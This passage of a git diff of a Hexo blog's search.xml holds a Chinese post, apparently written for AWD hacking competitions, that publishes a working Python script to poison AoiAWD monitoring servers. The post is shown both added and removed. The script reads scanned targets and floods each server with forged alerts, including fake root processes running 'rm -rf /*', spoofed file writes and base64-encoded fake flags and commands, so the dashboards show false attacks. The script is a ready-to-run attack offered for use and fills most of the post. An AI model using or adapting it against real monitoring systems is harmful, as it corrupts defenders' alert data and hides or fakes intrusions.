+<span class="line"><span style="color: #E1E4E8">                    sock.sendall(data2.encode(</span><span style="color: #9ECBFF">&quot;utf-8&quot;</span><span style="color: #E1E4E8">))</span></span>
+<span class="line"><span style="color: #E1E4E8">                    sock.sendall(data3.encode(</span><span style="color: #9ECBFF">&quot;utf-8&quot;</span><span style="color: #E1E4E8">))</span></span>
+<span class="line"><span style="color: #E1E4E8">                    sock.sendall(data4.encode(</span><span style="color: #9ECBFF">&quot;utf-8&quot;</span><span style="color: #E1E4E8">))</span></span>
+<span class="line"><span style="color: #E1E4E8">                    </span><span style="color: #F97583">for</span><span style="color: #E1E4E8"> j </span><span style="color: #F97583">in</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">range</span><span style="color: #E1E4E8">(</span><span style="color: #79B8FF">60</span><span style="color: #E1E4E8">):</span></span>
+<span class="line"><span style="color: #E1E4E8">                        sock.sendall(data7.encode(</span><span style="color: #9ECBFF">&quot;utf-8&quot;</span><span style="color: #E1E4E8">))</span></span>
+<span class="line"><span style="color: #E1E4E8">                    sock.sendall(data6.encode(</span><span style="color: #9ECBFF">&quot;utf-8&quot;</span><span style="color: #E1E4E8">))</span></span>
+<span class="line"><span style="color: #E1E4E8">                    sock.sendall(data5.encode(</span><span style="color: #9ECBFF">&quot;utf-8&quot;</span><span style="color: #E1E4E8">))</span></span>
+<span class="line"><span style="color: #E1E4E8">                    </span><span style="color: #79B8FF">print</span><span style="color: #E1E4E8">(</span><span style="color: #F97583">f</span><span style="color: #9ECBFF">&quot;[+] </span><span style="color: #79B8FF">{</span><span style="color: #E1E4E8">i</span><span style="color: #79B8FF">}\n</span><span style="color: #9ECBFF">&quot;</span><span style="color: #E1E4E8">)</span></span>
+<span class="line"><span style="color: #E1E4E8">                    sock.close()</span></span>
+<span class="line"><span style="color: #E1E4E8">                </span><span style="color: #F97583">else</span><span style="color: #E1E4E8">:</span></span>
+<span class="line"><span style="color: #E1E4E8">                    </span><span style="color: #79B8FF">print</span><span style="color: #E1E4E8">(</span></span>
+<span class="line"><span style="color: #E1E4E8">                        </span><span style="color: #F97583">f</span><span style="color: #9ECBFF">&quot;</span><span style="color: #79B8FF">\n</span><span style="color: #9ECBFF">[-] --------------------------------</span><span style="color: #79B8FF">{</span><span style="color: #E1E4E8">i</span><span style="color: #79B8FF">}</span><span style="color: #9ECBFF">-------------------------------------</span><span style="color: #79B8FF">\n</span><span style="color: #9ECBFF">&quot;</span></span>
+<span class="line"><span style="color: #E1E4E8">                    )</span></span>
+<span class="line"><span style="color: #E1E4E8">            </span><span style="color: #F97583">except</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">Exception</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">as</span><span style="color: #E1E4E8"> e:</span></span>
+<span class="line"><span style="color: #E1E4E8">                </span><span style="color: #79B8FF">print</span><span style="color: #E1E4E8">(</span><span style="color: #F97583">f</span><span style="color: #9ECBFF">&quot;An error occurred: </span><span style="color: #79B8FF">{</span><span style="color: #E1E4E8">e</span><span style="color: #79B8FF">}</span><span style="color: #9ECBFF">&quot;</span><span style="color: #E1E4E8">)</span></span></code></pre></div></div></figure>
+<h3 id="next"><a class="markdownIt-Anchor" href="#next"></a> Next</h3>
+<p>由于分析了各个 AWD 防御工具(Aoi、wathbird 等)</p>
+<p>决定模仿 aoi、并借鉴其他各个工具</p>
+<p>重写一个基于 go(gin 或 iris 大概率会用 gin)的 AWD 监测防御系统</p>
+<p>但是目前没有时间开发(<s>别问，问就是鸽</s>)</p>
+<p><s>预计会在 2025 年 5 月问世</s> ：)</p>
+<p>如果师傅们有留存的各个 AWD 比赛的流量等数据</p>
+<p>以及分析了解过官方 check 机制的师傅</p>
+<p>以及有大量参加 AWD 经验的大师傅</p>
+<p>欢迎联系本菜鸡</p>
+]]></content>
+      <categories>
+        <category>awd</category>
+      </categories>
+      <tags>
+        <tag>awd</tag>
+        <tag>AoiAWD</tag>
+        <tag>反制脚本</tag>
       </tags>
   </entry>
   <entry>
@@ -3120,87 +3201,6 @@ urlencode(’) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，M
         <tag>web</tag>
         <tag>sql</tag>
         <tag>sqli-lab</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AoiAWD反制脚本</title>
-    <url>/2024/05/untiAoi/</url>
-    <content><![CDATA[<h2 id="aoiawd-反制脚本"><a class="markdownIt-Anchor" href="#aoiawd-反制脚本"></a> AoiAWD 反制脚本</h2>
-<h3 id="起因"><a class="markdownIt-Anchor" href="#起因"></a> 起因</h3>
-<p>在经历过 awd 比赛中 AoiAWD 多次崩溃后(长城杯 虽然最后还是进决赛摸鱼了)</p>
-<p>赛后研究了一下</p>
-<p>开发了这个反制脚本</p>
-<p>由于打点队友喜欢用 gogo</p>
-<p>所以这个脚本支持 gogo 扫描结果</p>
-<h3 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h3>
-<p>发现后端未验证来自靶机的数据</p>
-<p>因此存在脏数据污染</p>
-<p>针对此开发脚本</p>
-<p>可向 AoiAWD 的各个数据展示页面投放脏数据</p>
-<p>包括告警页面</p>
-<h3 id="脚本"><a class="markdownIt-Anchor" href="#脚本"></a> 脚本</h3>
-<p>再此公布本脚本，希望下次 awd 遇见的时候别打我，谢谢 QAQ</p>
-<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #F97583">import</span><span style="color: #E1E4E8"> re</span></span>
-<span class="line"><span style="color: #F97583">import</span><span style="color: #E1E4E8"> socket</span></span>
-<span class="line"></span>
-<span class="line"><span style="color: #E1E4E8">f </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">open</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&quot;./ip.txt&quot;</span><span style="color: #E1E4E8">, </span><span style="color: #9ECBFF">&quot;r+&quot;</span><span style="color: #E1E4E8">)</span></span>
-<span class="line"><span style="color: #E1E4E8">url_list </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> f.readlines()</span></span>
-<span class="line"></span>
-<span class="line"><span style="color: #F97583">for</span><span style="color: #E1E4E8"> i </span><span style="color: #F97583">in</span><span style="color: #E1E4E8"> url_list:</span></span>
-<span class="line"><span style="color: #E1E4E8">    pattern </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">r</span><span style="color: #9ECBFF">&quot;</span><span style="color: #DBEDFF">tcp://</span><span style="color: #79B8FF">(\d</span><span style="color: #F97583">{1,3}</span><span style="color: #85E89D; font-weight: bold">\.</span><span style="color: #79B8FF">\d</span><span style="color: #F97583">{1,3}</span><span style="color: #85E89D; font-weight: bold">\.</span><span style="color: #79B8FF">\d</span><span style="color: #F97583">{1,3}</span><span style="color: #85E89D; font-weight: bold">\.</span><span style="color: #79B8FF">\d</span><span style="color: #F97583">{1,3}</span><span style="color: #DBEDFF">:</span><span style="color: #79B8FF">\d</span><span style="color: #F97583">+</span><span style="color: #79B8FF">)</span><span style="color: #9ECBFF">&quot;</span></span>
-<span class="line"><span style="color: #E1E4E8">    match </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> re.search(pattern, i, </span><span style="color: #79B8FF">0</span><span style="color: #E1E4E8">)</span></span>
-<span class="line"><span style="color: #E1E4E8">    </span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> match:</span></span>
-<span class="line"><span style="color: #E1E4E8">        i </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> match.group(</span><span style="color: #79B8FF">0</span><span style="color: #E1E4E8">).split(</span><span style="color: #9ECBFF">&quot;//&quot;</span><span style="color: #E1E4E8">)[</span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">]</span></span>
-<span class="line"><span style="color: #E1E4E8">        p </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">int</span><span style="color: #E1E4E8">(i.split(</span><span style="color: #9ECBFF">&quot;:&quot;</span><span style="color: #E1E4E8">)[</span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">])</span></span>
-<span class="line"><span style="color: #E1E4E8">        i </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> i.split(</span><span style="color: #9ECBFF">&quot;:&quot;</span><span style="color: #E1E4E8">)[</span><span style="color: #79B8FF">0</span><span style="color: #E1E4E8">]</span></span>
-<span class="line"><span style="color: #E1E4E8">        server_address </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> (i, p)  </span><span style="color: #6A737D"># 替换SERVER_IP和SERVER_PORT为实际值</span></span>
-<span class="line"><span style="color: #E1E4E8">        data </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;{&quot;type&quot;:&quot;ping&quot;}</span><span style="color: #79B8FF">\n</span><span style="color: #9ECBFF">&#39;</span></span>
-<span class="line"><span style="color: #E1E4E8">        data2 </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;{&quot;type&quot;:&quot;new_process&quot;,&quot;data&quot;:{&quot;pid&quot;:&quot;114514&quot;,&quot;ppid&quot;:&quot;114514&quot;,&quot;uid&quot;:&quot;0&quot;,&quot;username&quot;:&quot;root&quot;,&quot;cmd&quot;:&quot;rm -rf /*&quot;,&quot;param&quot;:&quot;su root rm -rf /*&quot;</span><span style="color: #79B8FF">}}\n</span><span style="color: #9ECBFF">&#39;</span></span>
-<span class="line"><span style="color: #E1E4E8">        data3 </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;{&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:{&quot;path&quot;:&quot;/update/score_points&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;ZmxhZ3tDcmF6eV9UaHVydGhkYXlfdl9tZV81MH0=&quot;</span><span style="color: #79B8FF">}}\n</span><span style="color: #9ECBFF">&#39;</span></span>
-<span class="line"><span style="color: #E1E4E8">        data4 </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;{&quot;type&quot;:&quot;web&quot;,&quot;data&quot;:{&quot;scipt&quot;:&quot;/var/www/html/rce.php&quot;,&quot;method&quot;:&quot;post&quot;,&quot;uri&quot;:&quot;127.0.0.1/rce.php&quot;,&quot;remote&quot;:&quot;127.0.0.1&quot;,&quot;buffer&quot;:&quot;{</span><span style="color: #79B8FF">\\</span><span style="color: #9ECBFF">&quot;flag</span><span style="color: #79B8FF">\\</span><span style="color: #9ECBFF">&quot;:</span><span style="color: #79B8FF">\\</span><span style="color: #9ECBFF">&quot;flag</span><span style="color: #79B8FF">{Crazy_Thurthday_v_me_50}\\</span><span style="color: #9ECBFF">&quot;}&quot;</span><span style="color: #79B8FF">}}\n</span><span style="color: #9ECBFF">&#39;</span></span>
-<span class="line"><span style="color: #E1E4E8">        data5 </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;{&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:{&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;</span><span style="color: #79B8FF">}}\n</span><span style="color: #9ECBFF">&#39;</span></span>
-<span class="line"><span style="color: #E1E4E8">        data6 </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;{&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:{&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;</span><span style="color: #79B8FF">}}\n</span><span style="color: #9ECBFF">&#39;</span></span>
-<span class="line"><span style="color: #E1E4E8">        data7 </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;{&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:{&quot;path&quot;:&quot;/114514&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;c3Ugcm9vdCBybSAtcmYgLyo=&quot;</span><span style="color: #79B8FF">}}\n</span><span style="color: #9ECBFF">&#39;</span></span>
-<span class="line"><span style="color: #E1E4E8">        </span><span style="color: #F97583">with</span><span style="color: #E1E4E8"> socket.socket(socket.</span><span style="color: #79B8FF">AF_INET</span><span style="color: #E1E4E8">, socket.</span><span style="color: #79B8FF">SOCK_STREAM</span><span style="color: #E1E4E8">) </span><span style="color: #F97583">as</span><span style="color: #E1E4E8"> sock:</span></span>
-<span class="line"><span style="color: #E1E4E8">            </span><span style="color: #F97583">try</span><span style="color: #E1E4E8">:</span></span>
-<span class="line"><span style="color: #E1E4E8">                sock.settimeout(</span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">)</span></span>
-<span class="line"><span style="color: #E1E4E8">                sock.connect(server_address)</span></span>
-<span class="line"><span style="color: #E1E4E8">                sock.sendall(data.encode(</span><span style="color: #9ECBFF">&quot;utf-8&quot;</span><span style="color: #E1E4E8">))</span></span>
-<span class="line"><span style="color: #E1E4E8">                tmp </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> sock.recvfrom(</span><span style="color: #79B8FF">1024</span><span style="color: #E1E4E8">)</span></span>
-<span class="line"><span style="color: #E1E4E8">                </span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;pong&quot;</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">in</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">str</span><span style="color: #E1E4E8">(tmp):</span></span>
-<span class="line"><span style="color: #E1E4E8">                    sock.sendall(data2.encode(</span><span style="color: #9ECBFF">&quot;utf-8&quot;</span><span style="color: #E1E4E8">))</span></span>
-<span class="line"><span style="color: #E1E4E8">                    sock.sendall(data3.encode(</span><span style="color: #9ECBFF">&quot;utf-8&quot;</span><span style="color: #E1E4E8">))</span></span>
-<span class="line"><span style="color: #E1E4E8">                    sock.sendall(data4.encode(</span><span style="color: #9ECBFF">&quot;utf-8&quot;</span><span style="color: #E1E4E8">))</span></span>
-<span class="line"><span style="color: #E1E4E8">                    </span><span style="color: #F97583">for</span><span style="color: #E1E4E8"> j </span><span style="color: #F97583">in</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">range</span><span style="color: #E1E4E8">(</span><span style="color: #79B8FF">60</span><span style="color: #E1E4E8">):</span></span>
-<span class="line"><span style="color: #E1E4E8">                        sock.sendall(data7.encode(</span><span style="color: #9ECBFF">&quot;utf-8&quot;</span><span style="color: #E1E4E8">))</span></span>
-<span class="line"><span style="color: #E1E4E8">                    sock.sendall(data6.encode(</span><span style="color: #9ECBFF">&quot;utf-8&quot;</span><span style="color: #E1E4E8">))</span></span>
-<span class="line"><span style="color: #E1E4E8">                    sock.sendall(data5.encode(</span><span style="color: #9ECBFF">&quot;utf-8&quot;</span><span style="color: #E1E4E8">))</span></span>
-<span class="line"><span style="color: #E1E4E8">                    </span><span style="color: #79B8FF">print</span><span style="color: #E1E4E8">(</span><span style="color: #F97583">f</span><span style="color: #9ECBFF">&quot;[+] </span><span style="color: #79B8FF">{</span><span style="color: #E1E4E8">i</span><span style="color: #79B8FF">}\n</span><span style="color: #9ECBFF">&quot;</span><span style="color: #E1E4E8">)</span></span>
-<span class="line"><span style="color: #E1E4E8">                    sock.close()</span></span>
-<span class="line"><span style="color: #E1E4E8">                </span><span style="color: #F97583">else</span><span style="color: #E1E4E8">:</span></span>
-<span class="line"><span style="color: #E1E4E8">                    </span><span style="color: #79B8FF">print</span><span style="color: #E1E4E8">(</span></span>
-<span class="line"><span style="color: #E1E4E8">                        </span><span style="color: #F97583">f</span><span style="color: #9ECBFF">&quot;</span><span style="color: #79B8FF">\n</span><span style="color: #9ECBFF">[-] --------------------------------</span><span style="color: #79B8FF">{</span><span style="color: #E1E4E8">i</span><span style="color: #79B8FF">}</span><span style="color: #9ECBFF">-------------------------------------</span><span style="color: #79B8FF">\n</span><span style="color: #9ECBFF">&quot;</span></span>
-<span class="line"><span style="color: #E1E4E8">                    )</span></span>
-<span class="line"><span style="color: #E1E4E8">            </span><span style="color: #F97583">except</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">Exception</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">as</span><span style="color: #E1E4E8"> e:</span></span>
-<span class="line"><span style="color: #E1E4E8">                </span><span style="color: #79B8FF">print</span><span style="color: #E1E4E8">(</span><span style="color: #F97583">f</span><span style="color: #9ECBFF">&quot;An error occurred: </span><span style="color: #79B8FF">{</span><span style="color: #E1E4E8">e</span><span style="color: #79B8FF">}</span><span style="color: #9ECBFF">&quot;</span><span style="color: #E1E4E8">)</span></span></code></pre></div></div></figure>
-<h3 id="next"><a class="markdownIt-Anchor" href="#next"></a> Next</h3>
-<p>由于分析了各个 AWD 防御工具(Aoi、wathbird 等)</p>
-<p>决定模仿 aoi、并借鉴其他各个工具</p>
-<p>重写一个基于 go(gin 或 iris 大概率会用 gin)的 AWD 监测防御系统</p>
-<p>但是目前没有时间开发(<s>别问，问就是鸽</s>)</p>
-<p><s>预计会在 2025 年 5 月问世</s> ：)</p>
-<p>如果师傅们有留存的各个 AWD 比赛的流量等数据</p>
-<p>以及分析了解过官方 check 机制的师傅</p>
-<p>以及有大量参加 AWD 经验的大师傅</p>
-<p>欢迎联系本菜鸡</p>
-]]></content>
-      <categories>
-        <category>awd</category>
-      </categories>
-      <tags>
-        <tag>awd</tag>
-        <tag>AoiAWD</tag>
-        <tag>反制脚本</tag>
       </tags>
   </entry>
   <entry>
